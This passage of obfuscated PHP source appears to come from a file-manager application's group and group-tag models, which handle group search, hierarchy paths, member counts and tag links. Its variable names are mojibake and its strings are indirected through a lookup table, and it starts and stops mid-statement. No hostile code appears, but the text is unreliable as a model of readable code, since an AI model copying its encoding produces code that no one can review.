"\163\x65\154\145\x63\164\x20\x67\162\157\165\x70\111\104\40\x66\x72\x6f\x6d\x20\140\x67\x72\x6f\x75\x70\x60\40\x77\x68\145\162\x65\40\160\x61\162\145\x6e\x74\x4c\145\x76\145\154\x20\154\x69\153\145\x20\47{$İª˜ª–µ[$õÂ¬–´[586]]}{$İª˜ª–µ[$õÂ¬–´[1986]]}\x2c\45\47"; } $Ë¦½Í± = implode($õÂ¬–´[2083], $Ë¦½Í±); $Ã°½è‰¸ = $this->query($Ë¦½Í±); if (!$Ã°½è‰¸) { return array(); } $Û´¿‰»° = array_to_keyvalue($Ã°½è‰¸, $õÂ¬–´[12], $õÂ¬–´[1986]); return array_unique($Û´¿‰»°); } public function listByID($‘°èÛ¥Ú) { $ª™È˜œ =& $_SERVER[¡¬ıÜ ƒ]; if (!$‘°èÛ¥Ú) { return array(); } $›¸Œ‚ùÌ = array($ª™È˜œ[1986] => array($ª™È˜œ[7], $‘°èÛ¥Ú)); $ÂÀ…–Á = $this->where($›¸Œ‚ùÌ)->select(); $ÂÀ…–Á = array_sort_keep($ÂÀ…–Á, $ª™È˜œ[1986], $‘°èÛ¥Ú); $this->_listDataApply($ÂÀ…–Á); return $ÂÀ…–Á; } public function listSearch($Ä…è½Õû) { $¦ò»ÙêÆ =& $_SERVER[¡¬ıÜ ƒ]; $Óå”ï‘ = trim($Ä…è½Õû[$¦ò»ÙêÆ[2084]]); $ Û´¢Í = explode($¦ò»ÙêÆ[53], $Óå”ï‘); if (!$Óå”ï‘ || count($ Û´¢Í) == 1) { return $this->listSearchNow($Ä…è½Õû); } $Š„º…±¹ = array($¦ò»ÙêÆ[447] => array()); foreach ($ Û´¢Í as $ª—æµ©) { if (!trim($ª—æµ©)) { continue; } $Ä…è½Õû[$¦ò»ÙêÆ[2084]] = $ª—æµ©; $àºë¾Ğƒ = $this->listSearchNow($Ä…è½Õû); $Š„º…±¹[$¦ò»ÙêÆ[447]] = array_merge($Š„º…±¹[$¦ò»ÙêÆ[447]], $àºë¾Ğƒ[$¦ò»ÙêÆ[447]]); } $Š„º…±¹[$¦ò»ÙêÆ[447]] = array_unique_by_key($Š„º…±¹[$¦ò»ÙêÆ[447]], $¦ò»ÙêÆ[1986]); $Š„º…±¹[$¦ò»ÙêÆ[444]] = array($¦ò»ÙêÆ[445] => count($Š„º…±¹[$¦ò»ÙêÆ[447]]), $¦ò»ÙêÆ[441] => 20, $¦ò»ÙêÆ[430] => 1, $¦ò»ÙêÆ[446] => 1); return $Š„º…±¹; } public function listSearchNow($Î±œÑ©) { $£Ñß‰ü… =& $_SERVER[¡¬ıÜ ƒ]; $ÌëŞĞÙ” = trim($Î±œÑ©[$£Ñß‰ü…[2084]]); $ªùîÕá½ = isset($Î±œÑ©[$£Ñß‰ü…[2085]]) ? $Î±œÑ©[$£Ñß‰ü…[2085]] : !1; if (!trim($ÌëŞĞÙ”)) { return !1; } $ÌëŞĞÙ” = str_replace($£Ñß‰ü…[2086], $£Ñß‰ü…[2087], $ÌëŞĞÙ”); $şÛ„—®ß = array($£Ñß‰ü…[1986] => array($£Ñß‰ü…[461], "{$ÌëŞĞÙ”}\45"), $£Ñß‰ü…[32] => array($£Ñß‰ü…[461], "\45{$ÌëŞĞÙ”}\x25"), $£Ñß‰ü…[1088] => $£Ñß‰ü…[2088]); if ($ªùîÕá½) { $º«Ú¹ÃÛ = $this->getInfoSimple($ªùîÕá½); $È¶”÷—Ã = $º«Ú¹ÃÛ[$£Ñß‰ü…[586]] . $ªùîÕá½ . $£Ñß‰ü…[618]; $şÛ„—®ß = array($şÛ„—®ß, array($£Ñß‰ü…[586] => array($£Ñß‰ü…[461], $È¶”÷—Ã))); } $şÛ„—®ß = $this->parseWhereLike($şÛ„—®ß); $×ÁÔå×§ = $this->_makeOrder()->where($şÛ„—®ß)->selectPage(20); $×ÁÔå×§ = $×ÁÔå×§ ? $×ÁÔå×§ : array($£Ñß‰ü…[447] => array(), $£Ñß‰ü…[444] => array()); if (!$×ÁÔå×§ || count($×ÁÔå×§[$£Ñß‰ü…[447]]) < 5 && Input::check($ÌëŞĞÙ”, $£Ñß‰ü…[395])) { $†ªĞÀ£¶ = $this->groupChildrenAll($ªùîÕá½); $Ğ´Â²şµ = $this->_searchFromMeta($£Ñß‰ü…[539], $ÌëŞĞÙ”, 10, $†ªĞÀ£¶); $±šÁ¨ÆŠ = $this->_searchFromMeta($£Ñß‰ü…[540], $ÌëŞĞÙ”, 10, $†ªĞÀ£¶); $˜Ÿ”ì = array_merge($Ğ´Â²şµ, $±šÁ¨ÆŠ, $×ÁÔå×§[$£Ñß‰ü…[447]]); $×ÁÔå×§[$£Ñß‰ü…[447]] = array_unique_by_key($˜Ÿ”ì, $£Ñß‰ü…[1986]); $×ÁÔå×§[$£Ñß‰ü…[444]][$£Ñß‰ü…[445]] = count($×ÁÔå×§[$£Ñß‰ü…[447]]); $×ÁÔå×§[$£Ñß‰ü…[444]][$£Ñß‰ü…[446]] = ceil($×ÁÔå×§[$£Ñß‰ü…[444]][$£Ñß‰ü…[445]] / $×ÁÔå×§[$£Ñß‰ü…[444]][$£Ñß‰ü…[441]]); } $this->_listDataApply($×ÁÔå×§[$£Ñß‰ü…[447]]); return $×ÁÔå×§; } protected function groupChildrenAll($‘À²Ï©¥) { $áğûå¼÷ =& $_SERVER[¡¬ıÜ ƒ]; if (!$‘À²Ï©¥) { return !1; } if (!is_array($‘À²Ï©¥)) { $‘À²Ï©¥ = array($‘À²Ï©¥); } $´™ÂãÓë = $‘À²Ï©¥; foreach ($‘À²Ï©¥ as $€÷Ú´§§) { $Âè»ñü³ = $this->getInfoSimple($€÷Ú´§§); $ŒÂá¿öÂ = array($áğûå¼÷[586] => array($áğûå¼÷[461], $Âè»ñü³[$áğûå¼÷[586]] . $€÷Ú´§§ . $áğûå¼÷[618])); $«ÙîßÌ« = $this->field($áğûå¼÷[1986])->where($ŒÂá¿öÂ)->select(); $´™ÂãÓë = array_merge($´™ÂãÓë, array_to_keyvalue($«ÙîßÌ«, $áğûå¼÷[12], $áğûå¼÷[1986])); } return array_unique($´™ÂãÓë); } private function _searchFromMeta($Õˆëıóµ, $½ö’Ïºõ, $î¼ğéèÅ, $ËŸ¬‹‚) { $òÑÄ´àç =& $_SERVER[¡¬ıÜ ƒ]; $½ö’Ïºõ = strtolower($½ö’Ïºõ); $ï†ñÆ = array($òÑÄ´àç[97] => $Õˆëıóµ, $òÑÄ´àç[452] => array($òÑÄ´àç[461], "\x25{$½ö’Ïºõ}\x25")); $ï†ñÆ = $this->parseWhereLike($ï†ñÆ); if ($ËŸ¬‹‚) { $ï†ñÆ[$òÑÄ´àç[1986]] = array($òÑÄ´àç[7], $ËŸ¬‹‚); } $”½ççàş = Model($òÑÄ´àç[2089])->where($ï†ñÆ)->limit($î¼ğéèÅ)->select(); if (!$”½ççàş) { return array(); } $”½ççàş = array_to_keyvalue($”½ççàş, $òÑÄ´àç[12], $òÑÄ´àç[1986]); $Ï£‰» = $this->where(array($òÑÄ´àç[2078] => array($òÑÄ´àç[7], $”½ççàş)))->select(); if (!$Ï£‰») { return array(); } return $Ï£‰»; } protected function _listDataApplyItem($íôœ¡÷•) { $¶ëÙôÑç = array($íôœ¡÷•); $this->_listDataApply($¶ëÙôÑç); return $¶ëÙôÑç[0]; } protected function _listDataApply(&$œÒÄ˜ßë) { $²öÖùø =& $_SERVER[¡¬ıÜ ƒ]; if (!$œÒÄ˜ßë) { return; } $Ã¦„×¸½ = array_to_keyvalue($œÒÄ˜ßë, $²öÖùø[12], $²öÖùø[1986]); $this->_listAppendChildren($œÒÄ˜ßë); $this->_listAppendChildrenMember($œÒÄ˜ßë); $this->_listAppendMeta($œÒÄ˜ßë, $Ã¦„×¸½); $this->_listAppendParent($œÒÄ˜ßë); $this->_listAppendSourceRoot($œÒÄ˜ßë, $Ã¦„×¸½); } private function _listAppendChildren(&$Ì£‰øÛµ) { $†İ¢üî =& $_SERVER[¡¬ıÜ ƒ]; $ô¿à“¤Ø = array_to_keyvalue($Ì£‰øÛµ, $†İ¢üî[12], $†İ¢üî[1986]); $÷šıù‡È = array($†İ¢üî[192] => array($†İ¢üî[7], $ô¿à“¤Ø)); $Ö¢‹á©Ş = array($†İ¢üî[192], $†İ¢üî[2090] => $†İ¢üî[567]); $«½±Ø£¡ = $this->field($Ö¢‹á©Ş)->where($÷šıù‡È)->group($†İ¢üî[192])->select(); $‚ ™ª›° = array_to_keyvalue($«½±Ø£¡, $†İ¢üî[192], $†İ¢üî[567]); foreach ($Ì£‰øÛµ as &$àå½è¼) { $ÅÚÆÌºû = $àå½è¼[$†İ¢üî[1986]]; $àå½è¼[$†İ¢üî[2091]] = isset($‚ ™ª›°[$ÅÚÆÌºû]) ? intval($‚ ™ª›°[$ÅÚÆÌºû]) : !1; } unset($àå½è¼); } private function _listAppendChildrenMember(&$óéªï) { $ÇÖõµ‹´ =& $_SERVER[¡¬ıÜ ƒ]; $éã½¥ÄÊ = array_to_keyvalue($óéªï, $ÇÖõµ‹´[12], $ÇÖõµ‹´[1986]); $½¯Ÿùîç = array($ÇÖõµ‹´[1986] => array($ÇÖõµ‹´[7], $éã½¥ÄÊ)); $ÑÚ¾¨ü = array($ÇÖõµ‹´[1986], $ÇÖõµ‹´[2090] => $ÇÖõµ‹´[567]); $ì¨…ÌğÔ = Model($ÇÖõµ‹´[2080])->field($ÑÚ¾¨ü)->where($½¯Ÿùîç)->group($ÇÖõµ‹´[1986])->select(); $ß“ë´œé = array_to_keyvalue($ì¨…ÌğÔ, $ÇÖõµ‹´[1986], $ÇÖõµ‹´[567]); foreach ($óéªï as &$ø¥íË“”) { $ŞñƒÌò = $ø¥íË“”[$ÇÖõµ‹´[1986]]; $ø¥íË“”[$ÇÖõµ‹´[2092]] = isset($ß“ë´œé[$ŞñƒÌò]) ? intval($ß“ë´œé[$ŞñƒÌò]) : !1; } unset($ø¥íË“”); } private function _listAppendMeta(&$˜ª¶İ‡¼, $•õëè¡) { $ò”–›Òç =& $_SERVER[¡¬ıÜ ƒ]; $˜¸ˆğ¥ç = array($ò”–›Òç[1986] => array($ò”–›Òç[7], $•õëè¡)); $³ŒÛë£× = Model($ò”–›Òç[2079])->where($˜¸ˆğ¥ç)->select(); $³ŒÛë£× = array_to_keyvalue_group($³ŒÛë£×, $ò”–›Òç[1986]); foreach ($³ŒÛë£× as &$«ŸóêÌŠ) { $«ŸóêÌŠ = array_to_keyvalue($«ŸóêÌŠ, $ò”–›Òç[97], $ò”–›Òç[452]); } unset($«ŸóêÌŠ); foreach ($˜ª¶İ‡¼ as &$¸¥îí‡£) { $¸¥îí‡£[$ò”–›Òç[541]] = array(); if (isset($³ŒÛë£×[$¸¥îí‡£[$ò”–›Òç[1986]]])) { $¸¥îí‡£[$ò”–›Òç[541]] = $³ŒÛë£×[$¸¥îí‡£[$ò”–›Òç[1986]]]; } } unset($¸¥îí‡£); } protected function parentLevelArray($ë²˜÷Ó¾) { $Æé‘Ö¾ =& $_SERVER[¡¬ıÜ ƒ]; $ë²˜÷Ó¾ = explode($Æé‘Ö¾[50], trim($ë²˜÷Ó¾, $Æé‘Ö¾[50])); $ë²˜÷Ó¾ = array_remove_value($ë²˜÷Ó¾, $Æé‘Ö¾[230]); return $ë²˜÷Ó¾; } protected function parentInGroup($è¹‘á‘Ñ, $Ó—×ëÇÇ) { $×§Š€áµ =& $_SERVER[¡¬ıÜ ƒ]; $Æãíºš« = $this->getInfoSimple($è¹‘á‘Ñ); if (!$Æãíºš«) { return !0; } $à‚şî²Ã = $this->parentLevelArray($Æãíºš«[$×§Š€áµ[586]]); $à‚şî²Ã[] = $è¹‘á‘Ñ; foreach ($à‚şî²Ã as $è¹‘á‘Ñ) { if (in_array($è¹‘á‘Ñ . $×§Š€áµ[12], $Ó—×ëÇÇ)) { return !0; } } return !1; } private function _listAppendParent(&$´«ƒÒ‹) { $‚Ì¨ô„ =& $_SERVER[¡¬ıÜ ƒ]; $ç¼«ñ† = array(); foreach ($´«ƒÒ‹ as &$¡áåŠªƒ) { $ç¼«ñ†[$¡áåŠªƒ[$‚Ì¨ô„[1986]]] = $¡áåŠªƒ[$‚Ì¨ô„[32]]; $Ö®°í²Ş = $this->parentLevelArray($¡áåŠªƒ[$‚Ì¨ô„[586]]); foreach ($Ö®°í²Ş as $ˆõ‹ØáÏ) { if (!isset($ç¼«ñ†[$ˆõ‹ØáÏ])) { $ç¼«ñ†[$ˆõ‹ØáÏ] = 0; } } } unset($¡áåŠªƒ); foreach ($ç¼«ñ† as $íûú¶½ => $©â§Ğ) { if ($©â§Ğ) { continue; } $“Ôšãğ‰ = $this->getInfoSimple($íûú¶½); $ç¼«ñ†[$íûú¶½] = $“Ôšãğ‰[$‚Ì¨ô„[32]]; } $ÀüšŒŠ¼ = $GLOBALS[$‚Ì¨ô„[6]][$‚Ì¨ô„[92]][$‚Ì¨ô„[2093]]; if (KodUser::isRoot()) { $ÀüšŒŠ¼ = !1; } foreach ($´«ƒÒ‹ as &$¡áåŠªƒ) { $Ö®°í²Ş = $this->parentLevelArray($¡áåŠªƒ[$‚Ì¨ô„[586]]); $Ìó‰ÌÊã = $‚Ì¨ô„[12]; foreach ($Ö®°í²Ş as $íûú¶½ => $ˆõ‹ØáÏ) { if ($ÀüšŒŠ¼ && $íûú¶½ == 0) { continue; } $Ìó‰ÌÊã .= $ç¼«ñ†[$ˆõ‹ØáÏ] . $‚Ì¨ô„[8]; } if ($Ö®°í²Ş) { $Ìó‰ÌÊã .= $¡áåŠªƒ[$‚Ì¨ô„[32]]; } $¡áåŠªƒ[$‚Ì¨ô„[591]] = str_replace($‚Ì¨ô„[256], $‚Ì¨ô„[8], $Ìó‰ÌÊã); } unset($¡áåŠªƒ); } private function _listAppendSourceRoot(&$Æ©»Øƒ—, $çêĞšá­) { $Ç—´İŠ =& $_SERVER[¡¬ıÜ ƒ]; $µîÉûì = Model($Ç—´İŠ[914])->listSourceRoot(SourceModel::TYPE_GROUP, $çêĞšá­); $µîÉûì = array_to_keyvalue($µîÉûì, $Ç—´İŠ[571]); $µîÉûì = array_remove_key($µîÉûì, $Ç—´İŠ[571]); foreach ($Æ©»Øƒ— as &$æÏú£Š) { $æÏú£Š[$Ç—´İŠ[90]] = $µîÉûì[$æÏú£Š[$Ç—´İŠ[1986]]] ? $µîÉûì[$æÏú£Š[$Ç—´İŠ[1986]]] : array(); } unset($æÏú£Š); } protected function groupMerge($É„İ‘¬ï) { $É„İ‘¬ï = array_values(array_unique($É„İ‘¬ï)); $­¼É = array(); for ($ÉíË¥ôÕ = 0; $ÉíË¥ôÕ < count($É„İ‘¬ï); $ÉíË¥ôÕ++) { $áú”•›Ê = !1; for ($‰‘¶ê°ğ = 0; $‰‘¶ê°ğ < count($É„İ‘¬ï); $‰‘¶ê°ğ++) { if ($ÉíË¥ôÕ == $‰‘¶ê°ğ) { continue; } if ($this->isParentOf($É„İ‘¬ï[$‰‘¶ê°ğ], $É„İ‘¬ï[$ÉíË¥ôÕ])) { $áú”•›Ê = !0; break; } } if (!$áú”•›Ê) { $­¼É[] = $É„İ‘¬ï[$ÉíË¥ôÕ]; } } return $­¼É; } protected function isParentOf($ ƒ¸ÏĞ©, $…ÊÉ¦²) { $±®©Ü’ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ ƒ¸ÏĞ© || !$…ÊÉ¦² || $ ƒ¸ÏĞ© == $…ÊÉ¦²) { return !1; } $‹Õç¬à¶ = $this->getInfoSimple($ ƒ¸ÏĞ©); $§ÀëŞ˜š = $this->getInfoSimple($…ÊÉ¦²); $©”¬ú¯Ê = $‹Õç¬à¶[$±®©Ü’[586]] . $ ƒ¸ÏĞ© . $±®©Ü’[50]; if (substr($§ÀëŞ˜š[$±®©Ü’[586]], 0, strlen($©”¬ú¯Ê)) == $©”¬ú¯Ê) { return !0; } return !1; } public function groupShowRoot($¿ß²»â, $—è¶Œ = false) { $ˆÙÁ—í™ =& $_SERVER[¡¬ıÜ ƒ]; $ˆ¨şºå× = $this->getInfo($¿ß²»â); if (!$ˆ¨şºå×) { return array(); } $‰±¹¸í£ = $this->parentLevelArray($ˆ¨şºå×[$ˆÙÁ—í™[586]]); $Å†„©Ô° = array($¿ß²»â); if (count($‰±¹¸í£) == 0) { return $Å†„©Ô°; } if ($—è¶Œ && count($‰±¹¸í£) == 1) { return $Å†„©Ô°; } if (!$ˆ¨şºå×[$ˆÙÁ—í™[541]] || !isset($ˆ¨şºå×[$ˆÙÁ—í™[541]][$ˆÙÁ—í™[2076]]) || $ˆ¨şºå×[$ˆÙÁ—í™[541]][$ˆÙÁ—í™[2076]] == $ˆÙÁ—í™[856]) { return $this->groupShowRoot($‰±¹¸í£[count($‰±¹¸í£) - 1], $—è¶Œ); } if ($ˆ¨şºå×[$ˆÙÁ—í™[541]][$ˆÙÁ—í™[2076]] == $ˆÙÁ—í™[434]) { $Öìô„Í• = explode($ˆÙÁ—í™[50], $ˆ¨şºå×[$ˆÙÁ—í™[541]][$ˆÙÁ—í™[2077]]); if ($Öìô„Í•) { $Å†„©Ô° = array_merge($Å†„©Ô°, $Öìô„Í•); } } return $Å†„©Ô°; } protected function resetParentLevel() { $á†Áéî =& $_SERVER[¡¬ıÜ ƒ]; $ÇœøÊ˜ù = $á†Áéî[1986]; $¾è¥ˆÄ = $this->select(); $¾è¥ˆÄ = array_to_keyvalue($¾è¥ˆÄ, $ÇœøÊ˜ù); foreach ($¾è¥ˆÄ as $…ú×ùÏ¾) { $Â°ÔßºÊ = $…ú×ùÏ¾; $¯ÏÄÜ¬Ú = array(); while ($Â°ÔßºÊ[$á†Áéî[192]] != 0) { $¯ÏÄÜ¬Ú[] = $Â°ÔßºÊ[$á†Áéî[192]]; $Â°ÔßºÊ = $¾è¥ˆÄ[$Â°ÔßºÊ[$á†Áéî[192]]]; } $¯ÏÄÜ¬Ú[] = 0; $¯ÏÄÜ¬Ú = $á†Áéî[50] . implode($á†Áéî[50], array_reverse($¯ÏÄÜ¬Ú)) . $á†Áéî[50]; $this->setNamePinyin($…ú×ùÏ¾[$ÇœøÊ˜ù], $…ú×ùÏ¾[$á†Áéî[32]]); $this->where(array($ÇœøÊ˜ù => $…ú×ùÏ¾[$ÇœøÊ˜ù]))->save(array($á†Áéî[657] => $¯ÏÄÜ¬Ú)); } return $¾è¥ˆÄ; } public function groupNameAuto($ı™†´ŸÔ, $Û°îğ×à) { $µ§ˆƒ¹« =& $_SERVER[¡¬ıÜ ƒ]; $®ÒäÅê = $this->where(array($µ§ˆƒ¹«[479] => $ı™†´ŸÔ))->getField($µ§ˆƒ¹«[32], !0); if (!$®ÒäÅê || !in_array($Û°îğ×à, $®ÒäÅê)) { return $Û°îğ×à; } for ($ äÉÈ× = 1; $ äÉÈ× <= count($®ÒäÅê) + 1; $ äÉÈ×++) { $ñÅ¥’ô» = $Û°îğ×à . "\50{$ äÉÈ×}\x29"; if (!in_array($ñÅ¥’ô», $®ÒäÅê)) { return $ñÅ¥’ô»; } } } public function groupSwitch($«æø°¾, $€ª¯ÓÀ) { $Óíí”ıÎ =& $_SERVER[¡¬ıÜ ƒ]; $¢†šË«Ï = array($Óíí”ıÎ[1986] => array($Óíí”ıÎ[7], array($«æø°¾, $€ª¯ÓÀ))); $¥®“ö = $this->where($¢†šË«Ï)->select(); $¥®“ö = array_to_keyvalue($¥®“ö, $Óíí”ıÎ[1986]); if (!isset($¥®“ö[$«æø°¾]) || !isset($¥®“ö[$€ª¯ÓÀ]) || $¥®“ö[$«æø°¾][$Óíí”ıÎ[192]] == 0) { return !1; } $¢†šË«Ï = array($Óíí”ıÎ[1986] => $«æø°¾); $é„àùëä = Model($Óíí”ıÎ[2080])->where($¢†šË«Ï)->select(); if (!$é„àùëä) { $é„àùëä = array(); } foreach ($é„àùëä as $äïíÕø”) { $ñ‡§îˆè = $äïíÕø”[$Óíí”ıÎ[1785]]; $¢†šË«Ï = array($Óíí”ıÎ[1785] => $ñ‡§îˆè, $Óíí”ıÎ[1986] => $€ª¯ÓÀ); $ì²¥«Î‘ = Model($Óíí”ıÎ[2080])->where($¢†šË«Ï)->find(); if (!$ì²¥«Î‘) { $µÏÃµô„ = array($€ª¯ÓÀ => $äïíÕø”[$Óíí”ıÎ[2094]]); Model($Óíí”ıÎ[599])->userGroupAdd($ñ‡§îˆè, $µÏÃµô„); } Model($Óíí”ıÎ[599])->userGroupRemove($ñ‡§îˆè, $«æø°¾); } $¢†šË«Ï = array($Óíí”ıÎ[190] => 2, $Óíí”ıÎ[192] => 0, $Óíí”ıÎ[487] => 1, $Óíí”ıÎ[571] => array($Óíí”ıÎ[7], array($«æø°¾, $€ª¯ÓÀ))); $ Ú­ìšì = Model($Óíí”ıÎ[914])->where($¢†šË«Ï)->field($Óíí”ıÎ[2095])->select(); $ Ú­ìšì = array_to_keyvalue($ Ú­ìšì, $Óíí”ıÎ[571], $Óíí”ıÎ[193]); $èóì×â× = !empty($ Ú­ìšì[$«æø°¾]) ? $ Ú­ìšì[$«æø°¾] : !1; if ($èóì×â×) { if (!$ Ú­ìšì[$€ª¯ÓÀ]) { $ Ú­ìšì[$€ª¯ÓÀ] = Model($Óíí”ıÎ[914])->groupRootAdd($€ª¯ÓÀ); } $¡³çÆÙ = $ Ú­ìšì[$€ª¯ÓÀ]; $¢†šË«Ï = array($Óíí”ıÎ[192] => $èóì×â×); $ Ú­ìšì = Model($Óíí”ıÎ[914])->where($¢†šË«Ï)->field($Óíí”ıÎ[2096])->select(); if (!$ Ú­ìšì) { $ Ú­ìšì = array(); } Model($Óíí”ıÎ[914])->moveClearAuth = !1; foreach ($ Ú­ìšì as $’ÑºÌ«) { $œÂÅÔ… = $’ÑºÌ«[$Óíí”ıÎ[487]] == $Óíí”ıÎ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Óíí”ıÎ[914])->move($’ÑºÌ«[$Óíí”ıÎ[193]], $¡³çÆÙ, $œÂÅÔ…); } Model($Óíí”ıÎ[914])->moveClearAuth = !0; $¢†šË«Ï = array($Óíí”ıÎ[190] => 2, $Óíí”ıÎ[571] => $«æø°¾); $³òØ¼ô¸ = array($Óíí”ıÎ[571] => $€ª¯ÓÀ); Model($Óíí”ıÎ[2097])->where($¢†šË«Ï)->save($³òØ¼ô¸); Model($Óíí”ıÎ[2098])->where($¢†šË«Ï)->save($³òØ¼ô¸); } $this->_changeChildLevel($¥®“ö[$«æø°¾], $¥®“ö[$€ª¯ÓÀ], !0); $this->where(array($Óíí”ıÎ[192] => $«æø°¾))->save(array($Óíí”ıÎ[192] => $€ª¯ÓÀ)); $this->_clearChildrenCache($¥®“ö[$€ª¯ÓÀ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($úÅÚØœë) { $ÉšÁò‰£ =& $_SERVER[¡¬ıÜ ƒ]; return array($ÉšÁò‰£[2099] => array($úÅÚØœë[0], $ÉšÁò‰£[2100]), $ÉšÁò‰£[2101] => array($úÅÚØœë[0], $ÉšÁò‰£[2102])); } protected function get($ßù´ÙòÅ) { $î»ÃÉñì =& $_SERVER[¡¬ıÜ ƒ]; $¥ê©•à” = Model($î»ÃÉñì[587])->metaGet($ßù´ÙòÅ, $î»ÃÉñì[2103]); $ñé±Ä‰ß = json_decode($¥ê©•à”, !0); return $ñé±Ä‰ß ? $ñé±Ä‰ß : array($î»ÃÉñì[2104] => $î»ÃÉñì[91], $î»ÃÉñì[447] => array()); } protected function set($İ¯ºıá—, $¤Š¢©‘¯) { $€è†­ =& $_SERVER[¡¬ıÜ ƒ]; $¤Š¢©‘¯ = $¤Š¢©‘¯ ? $¤Š¢©‘¯ : array($€è†­[2104] => $€è†­[91], $€è†­[447] => array()); return Model($€è†­[587])->metaSet($İ¯ºıá—, $€è†­[2103], json_encode($¤Š¢©‘¯)); } protected function getByTagID($§ˆ¿ÛÀû, $ıæº°éÉ) { $Œ±î“Ù =& $_SERVER[¡¬ıÜ ƒ]; if (!$§ˆ¿ÛÀû || !$ıæº°éÉ) { return !1; } if (!Model($Œ±î“Ù[587])->getInfoSimple($§ˆ¿ÛÀû)) { return !1; } $üšçÃ = $this->get($§ˆ¿ÛÀû); if (!$üšçÃ || !isset($üšçÃ[$Œ±î“Ù[447]])) { return !1; } $‡ò§°‰Ã = array_find_by_field($üšçÃ[$Œ±î“Ù[447]], $Œ±î“Ù[477], $ıæº°éÉ); return is_array($‡ò§°‰Ã) ? $‡ò§°‰Ã : !1; } public function listSource($¤Ğ‚ì–É, $ğåÚ·åÔ) { $Ûä‰áªë =& $_SERVER[¡¬ıÜ ƒ]; if ($ğåÚ·åÔ && !is_array($ğåÚ·åÔ)) { $ğåÚ·åÔ = array($ğåÚ·åÔ); } $‘îé­Ê‘ = $this->listData($¤Ğ‚ì–É); $´©£ëÆÉ = array(); foreach ($‘îé­Ê‘ as $ÓáåÕãñ) { $ƒ¸ÀÁ³± = $ÓáåÕãñ[$Ûä‰áªë[87]]; if (!$ƒ¸ÀÁ³±) { continue; } if (!isset($´©£ëÆÉ[$ƒ¸ÀÁ³±])) { $´©£ëÆÉ[$ƒ¸ÀÁ³±] = array(); } $´©£ëÆÉ[$ƒ¸ÀÁ³±][] = $ÓáåÕãñ[$Ûä‰áªë[502]]; } $ÀèÕû˜Î = array(); foreach ($´©£ëÆÉ as $ëÔ·èä => $©Æ†ª”) { $¨ğæı˜Â = !0; if (!$ğåÚ·åÔ) { $ÀèÕû˜Î[] = $ëÔ·èä; continue; } foreach ($ğåÚ·åÔ as $ş ¯È¨) { if (!in_array($ş ¯È¨, $©Æ†ª”)) { $¨ğæı˜Â = !1; break; } } if ($¨ğæı˜Â) { $ÀèÕû˜Î[] = $ëÔ·èä; } } if (!$ÀèÕû˜Î) { return array(); } $±Ì÷ä¶½ = array($Ûä‰áªë[493] => array($Ûä‰áªë[494], $ÀèÕû˜Î), $Ûä‰áªë[571] => $¤Ğ‚ì–É, $Ûä‰áªë[190] => SourceModel::TYPE_GROUP); $óŠ´—¬È = Model($Ûä‰áªë[1432])->listSource($±Ì÷ä¶½); if (!$óŠ´—¬È || count($ÀèÕû˜Î) == $óŠ´—¬È[$Ûä‰áªë[444]][$Ûä‰áªë[445]]) { return $óŠ´—¬È; } $õµÆ¨‚é = array(); $ÕÊ¬óĞ¢ = array_to_keyvalue($óŠ´—¬È[$Ûä‰áªë[85]], $Ûä‰áªë[12], $Ûä‰áªë[193]); $À”ì›Á’ = array_to_keyvalue($óŠ´—¬È[$Ûä‰áªë[86]], $Ûä‰áªë[12], $Ûä‰áªë[193]); $›µ¢Û¨® = array_merge($À”ì›Á’, $ÕÊ¬óĞ¢); foreach ($ÀèÕû˜Î as $ƒ¸ÀÁ³±) { if (!in_array($ƒ¸ÀÁ³±, $›µ¢Û¨®)) { $õµÆ¨‚é[] = $ƒ¸ÀÁ³±; } } if ($õµÆ¨‚é) { $this->removeBySource($¤Ğ‚ì–É, $õµÆ¨‚é); } return $óŠ´—¬È; } protected function listData($´×Ë) { $ãÌñŞ¢ş =& $_SERVER[¡¬ıÜ ƒ]; $»İšĞÆÛ = array($ãÌñŞ¢ş[1776] => 0, $ãÌñŞ¢ş[559] => array($ãÌñŞ¢ş[2105], 0), $ãÌñŞ¢ş[498] => $ãÌñŞ¢ş[2106] . $´×Ë); $‘Ï»‚ëÏ = $ãÌñŞ¢ş[2107]; $Ëµ„Çì‹ = $this->field($‘Ï»‚ëÏ)->where($»İšĞÆÛ)->order($ãÌñŞ¢ş[2108])->select(); return $Ëµ„Çì‹ ? $Ëµ„Çì‹ : array(); } protected function addToTag($ä·”–ó„, $Íèƒ•ûù, $ä¥­À¶â) { $Ë¦ˆ¡õ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->getByTagID($ä·”–ó„, $ä¥­À¶â) || !$Íèƒ•ûù) { return !1; } if (!Model($Ë¦ˆ¡õ[914])->pathInfo($Íèƒ•ûù)) { return !1; } $ÅÁ«²êÍ = array($Ë¦ˆ¡õ[1776] => 0, $Ë¦ˆ¡õ[559] => $ä¥­À¶â, $Ë¦ˆ¡õ[497] => $Íèƒ•ûù, $Ë¦ˆ¡õ[498] => $Ë¦ˆ¡õ[2109] . $ä·”–ó„, $Ë¦ˆ¡õ[496] => $Ë¦ˆ¡õ[12], $Ë¦ˆ¡õ[1990] => 0); if ($this->where($ÅÁ«²êÍ)->find()) { return !1; } return $this->add($ÅÁ«²êÍ); } protected function removeFromTag($ñì…×Š, $ ß¤ úš, $òºüôôÛ) { $şÒŒ¥¼ü =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->getByTagID($ñì…×Š, $òºüôôÛ) || !$ ß¤ úš) { return !1; } if (is_array($ ß¤ úš)) { $ ß¤ úš = array($şÒŒ¥¼ü[7], $ ß¤ úš); } $ƒ‹ÔèÓœ = array($şÒŒ¥¼ü[1776] => 0, $şÒŒ¥¼ü[559] => $òºüôôÛ, $şÒŒ¥¼ü[498] => $şÒŒ¥¼ü[2109] . $ñì…×Š, $şÒŒ¥¼ü[497] => $ ß¤ úš); return $this->where($ƒ‹ÔèÓœ)->delete(); } protected function removeByTag($Ëí‡Âá³, $øƒš¯–) { $‡µ­¶ª =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->getByTagID($Ëí‡Âá³, $øƒš¯–)) { return !1; } $Ÿ¹š‰§Ò = array($‡µ­¶ª[1776] => 0, $‡µ­¶ª[559] => $øƒš¯–, $‡µ­¶ª[498] => $‡µ­¶ª[2109] . $Ëí‡Âá³); return $this->where($Ÿ¹š‰§Ò)->delete(); } protected function removeBySource($ÂÙ–…şô, $üÇ…Úå…) { $Ç˜î»ïº =& 